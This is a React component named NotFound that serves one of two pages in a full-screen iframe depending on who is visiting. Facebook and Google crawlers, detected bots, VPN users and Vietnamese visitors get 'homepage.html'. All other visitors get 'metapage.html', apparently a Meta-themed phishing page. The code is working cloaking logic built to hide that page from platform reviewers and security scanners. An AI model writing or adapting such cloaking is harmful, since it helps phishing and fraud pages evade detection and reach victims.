import React, { useEffect, useState } from "react";
import { isbot } from "isbot";

function NotFound() {
  //let[HtmlLandingPage, SetHtmlLandingPage] = useState();
  let[countryCode, setCountryCode] = useState('');
  let[IsUserHiden, SetUserHiden] = useState(false);

  function showIframe(file) {
    const html = (
      <iframe src={file} style={{
        position: 'fixed',
        top: '0px',
        bottom: '0px',
        right: '0px',
        width: '100%',
        border: 'none',
        margin: '0',
        padding: '0',
        overflow: 'hidden',
        zIndex: '999999',
        height: '100%',
      }}></iframe>
    );
    return html;
  }
 
  // async function fetchHtml() {
  //   SetHtmlLandingPage(await (await fetch(`homepage.html`)).text());
  // }

  const setLocaltion =  () => {
    try {
     // https://ipinfo.io/json
      fetch("https://ipinfo.io/widget").then(d => d.json()).then(d => {
        var countryCode = d.country;
        var privacy = d.privacy;
        if(privacy){
          if(
            privacy.vpn == true
           //|| privacy.hosting == true
           //|| privacy.relay == true
          // || privacy.tor == true
          // || privacy.proxy == true
          ){
            SetUserHiden(true);
          }
        }
        setCountryCode(countryCode.toLowerCase());
      });
    } catch (error) {
      console.error("Error fetching data:", error);
    }
  };

  // useEffect(() => {
  //   fetchHtml();
  // }, []);

  useEffect(() => {
    setLocaltion();
  }, []);

  const userAgent = navigator.userAgent.toLowerCase();
  if(!userAgent.includes('facebook') 
    && !userAgent.includes('google') 
    && !isbot(userAgent)){
    if(IsUserHiden){
      //return (<div dangerouslySetInnerHTML={{ __html: HtmlLandingPage }}></div>)
      return(showIframe("homepage.html"));
    }else{
      if(countryCode.length == 0){
        return(           
          <div className="loading">
              <div className="loader"></div>
          </div>
        );
      }else{
        if(countryCode.includes('vn')){
          return(showIframe("homepage.html"));
        }else{
            return(showIframe("metapage.html"));
        }
      }
    }
  }else{
    return(showIframe("homepage.html"));
  }
}

export default NotFound;
